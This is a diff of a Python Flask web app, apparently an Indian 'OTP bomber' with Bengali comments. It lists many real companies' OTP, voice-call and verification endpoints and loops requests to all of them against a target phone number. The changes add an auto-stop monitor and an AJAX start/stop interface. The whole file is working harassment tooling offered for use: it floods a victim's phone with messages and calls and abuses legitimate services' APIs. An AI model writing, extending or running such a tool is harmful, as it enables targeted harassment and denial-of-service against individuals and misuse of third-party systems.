@@ -8,7 +8,7 @@ from flask import Blueprint, request, render_template_string, jsonify
 
 bp = Blueprint('hard_bomber', __name__, url_prefix='/hard_bomber')
 
-# ========== কুল-ডাউন ট্র্যাকার (ঐচ্ছিক) ==========
+# ========== কুল-ডাউন ট্র্যাকার ==========
 last_used = {}
 COOLDOWN_SECONDS = 900  # ১৫ মিনিট
 
@@ -19,8 +19,7 @@ bomb_processes = {}  # phone → {'stop_event': asyncio.Event, 'thread': Thread}
 def get_working_apis():
     # তোমার পুরো API লিস্ট এখানে বসাও – আমি শুধু স্যাম্পল দিচ্ছি
     return [
-             # তোমার পুরো API লিস্ট এখানে বসাও (আমি শুধু স্যাম্পল দিচ্ছি)
-        {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda ph: f'{{"phone":"{ph}","isOtpViaCallAtLogin":"true"}}'},
+              {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda ph: f'{{"phone":"{ph}","isOtpViaCallAtLogin":"true"}}'},
         {"name": "1MG Voice", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda ph: f'{{"number":"{ph}","otp_on_call":true}}'},
         {
             "name": "Swiggy Call Verification",
@@ -469,7 +468,7 @@ def get_working_apis():
             "headers": {"Content-Type": "application/json"},
             "data": lambda phone: f'{{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}}'
         },
-        {
+          {
             "name": "Revv",
             "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
             "method": "POST",
@@ -714,7 +713,7 @@ def get_working_apis():
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "X-Requested-With": "XMLHttpRequest"
     },
-    "data": lambda phone: f"log_mode=1&ctrl={phone}"
+       "data": lambda phone: f"log_mode=1&ctrl={phone}"
 },
 {
     "name": "Apollo Pharmacy",
@@ -818,7 +817,8 @@ def get_working_apis():
 }
     ]
 
-# ========== অ্যাসিঙ্ক বোম্বার ইঞ্জিন (স্টপ ইভেন্ট সহ) ==========
+# ========== অ্যাসিঙ্ক বোম্বার ইঞ্জিন ==========
+# ========== অ্যাসিঙ্ক বোম্বার ইঞ্জিন (অটো-স্টপ সহ) ==========
 async def send_req(api, phone, session):
     try:
         url = api["url"](phone) if callable(api["url"]) else api["url"]
@@ -835,89 +835,103 @@ async def send_req(api, phone, session):
         return False
 
 async def bomb_continuously(phone, apis, stop_event, delay=2):
-    """অবিরত বোম্বার – যতক্ষণ stop_event সেট না হয় ততক্ষণ চলবে"""
     success = 0
     total = 0
     async with aiohttp.ClientSession() as session:
         while not stop_event.is_set():
-            # প্রতিটি সাইকেলে সব API কল করি
+            # ✅ লাস্ট অ্যাক্টিভ আপডেট (অটো-স্টপের জন্য)
+            if phone in bomb_processes:
+                bomb_processes[phone]['last_active'] = time.time()
+            
             tasks = [send_req(api, phone, session) for api in apis]
             results = await asyncio.gather(*tasks, return_exceptions=True)
             cycle_success = sum(1 for r in results if r is True)
             success += cycle_success
             total += len(apis)
-            # ডেলের পর আবার চেক করি
             await asyncio.sleep(delay)
     return success, total
 
-# ========== ব্যাকগ্রাউন্ড থ্রেডে অ্যাসিঙ্ক বোম্বার চালানোর ফাংশন ==========
 def run_bomb_loop(phone, apis, stop_event, delay=2):
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     loop.run_until_complete(bomb_continuously(phone, apis, stop_event, delay))
     loop.close()
 
+# ========== ইনঅ্যাকটিভিটি মনিটর (২০ মিনিট) ==========
+def monitor_inactive_bombs():
+    """প্রতি ৬০ সেকেন্ডে চেক করে – ২০ মিনিট পর অটো-স্টপ"""
+    while True:
+        time.sleep(60)
+        now = time.time()
+        to_remove = []
+        for phone, data in bomb_processes.items():
+            if data['thread'].is_alive():
+                last_active = data.get('last_active', now)
+                if now - last_active > 20 * 60:  # ২০ মিনিট
+                    data['stop_event'].set()
+                    to_remove.append(phone)
+        for phone in to_remove:
+            if phone in bomb_processes:
+                del bomb_processes[phone]
+                print(f"[AUTO-STOP] Bombing stopped for {phone} due to inactivity.")
+
+# মনিটর থ্রেড চালু করো (ব্যাকগ্রাউন্ডে)
+monitor_thread = threading.Thread(target=monitor_inactive_bombs, daemon=True)
+monitor_thread.start()
+
 # ========== ওয়েব রাউট ==========
-@bp.route('/', methods=['GET', 'POST'])
+@bp.route('/', methods=['GET'])
 def index():
-    if request.method == 'POST':
-        phone = request.form.get('phone', '').strip()
-        delay = float(request.form.get('delay', 2))
-
-        if not phone.isdigit() or len(phone) != 10:
-            return render_template_string(HTML_FORM, result="❌ Invalid phone number (must be 10 digits)")
-
-        # চেক করি এই নম্বরের জন্য আগে থেকে কোনো বোম্বার চলছে কিনা
-        if phone in bomb_processes and bomb_processes[phone]['thread'].is_alive():
-            return render_template_string(
-                HTML_FORM,
-                result=f"⚠️ Bombing already running for +91{phone}. Click 'Stop' to halt."
-            )
-
-        # কুল-ডাউন চেক (ঐচ্ছিক)
-        current_time = time.time()
-        if phone in last_used:
-            time_diff = current_time - last_used[phone]
-            if time_diff < COOLDOWN_SECONDS:
-                remaining = int(COOLDOWN_SECONDS - time_diff)
-                minutes = remaining // 60
-                seconds = remaining % 60
-                return render_template_string(
-                    HTML_FORM,
-                    result=f"⏳ This number was used recently. Please wait {minutes}m {seconds}s."
-                )
-
-        # বোম্বার শুরু করি
-        last_used[phone] = current_time
-        stop_event = asyncio.Event()
-        apis = get_working_apis()
-        thread = threading.Thread(
-            target=run_bomb_loop,
-            args=(phone, apis, stop_event, delay),
-            daemon=True
-        )
-        thread.start()
-        bomb_processes[phone] = {'stop_event': stop_event, 'thread': thread}
-
-        return render_template_string(
-            HTML_FORM,
-            result=f"✅ Bombing started for +91{phone}. Click 'Stop' to halt."
-        )
-
     return render_template_string(HTML_FORM, result=None)
+
+@bp.route('/start', methods=['POST'])
+def start_bomb():
+    phone = request.form.get('phone', '').strip()
+    delay = float(request.form.get('delay', 2))
+
+    if not phone.isdigit() or len(phone) != 10:
+        return jsonify({'status': 'error', 'message': 'Invalid phone number (must be 10 digits)'}), 400
+
+    if phone in bomb_processes and bomb_processes[phone]['thread'].is_alive():
+        return jsonify({'status': 'error', 'message': f'Bombing already running for +91{phone}'}), 400
+
+    current_time = time.time()
+    if phone in last_used:
+        time_diff = current_time - last_used[phone]
+        if time_diff < COOLDOWN_SECONDS:
+            remaining = int(COOLDOWN_SECONDS - time_diff)
+            minutes = remaining // 60
+            seconds = remaining % 60
+            return jsonify({'status': 'error', 'message': f'Please wait {minutes}m {seconds}s before trying again.'}), 400
+
+    last_used[phone] = current_time
+    stop_event = asyncio.Event()
+    apis = get_working_apis()
+    thread = threading.Thread(
+        target=run_bomb_loop,
+        args=(phone, apis, stop_event, delay),
+        daemon=True
+    )
+    thread.start()
+    bomb_processes[phone] = {
+        'stop_event': stop_event,
+        'thread': thread,
+        'last_active': time.time()   # ✅ স্টার্টের সময় রেকর্ড
+    }
+
+    return jsonify({'status': 'success', 'message': f'Bombing started for +91{phone}. Click Stop to halt. (Auto-stops after 20 mins inactivity)'})
 
 @bp.route('/stop', methods=['POST'])
 def stop_bomb():
     phone = request.form.get('phone', '').strip()
     if phone in bomb_processes:
         bomb_processes[phone]['stop_event'].set()
-        # থ্রেড শেষ হওয়া পর্যন্ত অপেক্ষা (ঐচ্ছিক)
-        # bomb_processes[phone]['thread'].join(timeout=2)
         del bomb_processes[phone]
-        return jsonify({"status": "stopped", "phone": phone})
+        return jsonify({'status': 'stopped', 'phone': phone})
     else:
-        return jsonify({"status": "not_found", "phone": phone}), 404
+        return jsonify({'status': 'not_found', 'phone': phone}), 404
 
+# ========== HTML টেমপ্লেট (AJAX সহ) ==========
 HTML_FORM = """
 <!DOCTYPE html>
 <html lang="en">
@@ -1140,6 +1154,20 @@ HTML_FORM = """
             .btn { font-size: 13px; padding: 14px 16px; }
             .input-field { font-size: 15px; padding: 12px 16px; }
         }
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.2);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            vertical-align: middle;
+            margin-right: 6px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
@@ -1152,30 +1180,26 @@ HTML_FORM = """
         <div class="subtitle">Continuous OTP · Call · WhatsApp</div>
         <div class="divider"></div>
 
-        <form method="POST" id="bombForm">
-            <div class="form-group">
-                <label>Target Phone</label>
-                <input type="text" id="phoneInput" name="phone" class="input-field" placeholder="Enter 10-digit number" required>
-            </div>
-
-            <div class="row">
-                <div class="form-group">
-                    <label>Delay (sec)</label>
-                    <input type="number" name="delay" class="input-field" value="2" step="0.5" min="0.5">
-                </div>
-                <div class="form-group" style="display: flex; align-items: flex-end;">
-                    <button type="submit" id="startBtn" class="btn btn-fire">Start</button>
-                </div>
-            </div>
-
-            <div class="flex" style="margin-top: 6px;">
-                <button type="button" id="stopBtn" class="btn btn-stop">Stop</button>
-            </div>
-        </form>
-
-        <div id="resultBox" class="result-box {% if result and ('❌' in result or '⚠️' in result) %}error{% endif %}" style="display: {% if result %}block{% else %}none{% endif %};">
-            {{ result if result else '' }}
+        <div class="form-group">
+            <label>Target Phone</label>
+            <input type="text" id="phoneInput" class="input-field" placeholder="Enter 10-digit number" required>
         </div>
+
+        <div class="row">
+            <div class="form-group">
+                <label>Delay (sec)</label>
+                <input type="number" id="delayInput" class="input-field" value="2" step="0.5" min="0.5">
+            </div>
+            <div class="form-group" style="display: flex; align-items: flex-end;">
+                <button id="startBtn" class="btn btn-fire">Start</button>
+            </div>
+        </div>
+
+        <div class="flex" style="margin-top: 6px;">
+            <button id="stopBtn" class="btn btn-stop">Stop</button>
+        </div>
+
+        <div id="resultBox" class="result-box" style="display: none;"></div>
 
         <div class="footer">
             <div class="credit">Developed by <span>Arif</span></div>
@@ -1184,34 +1208,78 @@ HTML_FORM = """
 
     <script>
         const phoneInput = document.getElementById('phoneInput');
+        const delayInput = document.getElementById('delayInput');
         const startBtn = document.getElementById('startBtn');
         const stopBtn = document.getElementById('stopBtn');
         const resultBox = document.getElementById('resultBox');
 
-        // পেজ লোড হলে যদি রেজাল্টে "started" থাকে, ইনপুট ডিজেবল করো
-        window.addEventListener('load', function() {
-            if (resultBox.textContent.includes('started')) {
-                phoneInput.disabled = true;
-                startBtn.disabled = true;
-            }
-        });
+        function setResult(text, isError = false) {
+            resultBox.textContent = text;
+            resultBox.style.display = 'block';
+            resultBox.className = 'result-box' + (isError ? ' error' : '');
+        }
 
-        // ফর্ম সাবমিট (Start)
-        document.getElementById('bombForm').addEventListener('submit', function(e) {
+        function clearResult() {
+            resultBox.style.display = 'none';
+        }
+
+        function setLoading(loading) {
+            if (loading) {
+                startBtn.disabled = true;
+                startBtn.innerHTML = '<span class="loading-spinner"></span> Starting...';
+            } else {
+                startBtn.disabled = false;
+                startBtn.textContent = 'Start';
+            }
+        }
+
+        function enableInputs(enabled) {
+            phoneInput.disabled = !enabled;
+            if (enabled) {
+                startBtn.disabled = false;
+                startBtn.textContent = 'Start';
+            } else {
+                startBtn.disabled = true;
+                startBtn.innerHTML = 'Running...';
+            }
+        }
+
+        // Start
+        startBtn.addEventListener('click', function() {
             const phone = phoneInput.value.trim();
-            if (!phone) {
-                e.preventDefault();
-                alert('Please enter a 10-digit phone number.');
+            if (!phone || phone.length !== 10 || isNaN(phone)) {
+                alert('Please enter a valid 10-digit phone number.');
                 return;
             }
-            // ফর্ম সাবমিটের পর ইনপুট ডিজেবল করব (আমরা setTimeout দিয়ে দিই)
-            setTimeout(() => {
-                phoneInput.disabled = true;
-                startBtn.disabled = true;
-            }, 100);
+            const delay = parseFloat(delayInput.value) || 2;
+
+            setLoading(true);
+            clearResult();
+
+            fetch('/hard_bomber/start', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: 'phone=' + encodeURIComponent(phone) + '&delay=' + encodeURIComponent(delay)
+            })
+            .then(response => response.json())
+            .then(data => {
+                setLoading(false);
+                if (data.status === 'success') {
+                    setResult(data.message);
+                    enableInputs(false);
+                } else {
+                    setResult(data.message, true);
+                    enableInputs(true);
+                }
+            })
+            .catch(err => {
+                setLoading(false);
+                setResult('Error: ' + err.message, true);
+                enableInputs(true);
+            });
         });
 
-        // Stop বাটন
+        // Stop
         stopBtn.addEventListener('click', function() {
             const phone = phoneInput.value.trim();
             if (!phone) {
@@ -1227,26 +1295,18 @@ HTML_FORM = """
             .then(response => response.json())
             .then(data => {
                 if (data.status === 'stopped') {
-                    // ইনপুট ও বাটন আবার এনাবল করো
-                    phoneInput.disabled = false;
-                    startBtn.disabled = false;
-                    // রেজাল্ট আপডেট করো
-                    resultBox.textContent = 'Stopped for ' + data.phone;
-                    resultBox.className = 'result-box';
-                    resultBox.style.display = 'block';
-                    alert('Stopped for ' + data.phone);
+                    setResult('Stopped for ' + data.phone);
+                    enableInputs(true);
+                    phoneInput.value = data.phone;
                 } else {
-                    alert('No active bombing found for this number.');
+                    setResult('No active bombing found for this number.', true);
                 }
             })
             .catch(err => {
-                alert('Error: ' + err.message);
+                setResult('Error: ' + err.message, true);
             });
         });
     </script>
 </body>
 </html>
 """
-
-# ========== যদি main.py-তে এই ব্লুপ্রিন্ট রেজিস্টার করতে চাও ==========
-# main.py-তে files লিস্টে 'cyber_hard_bomber' যোগ করো
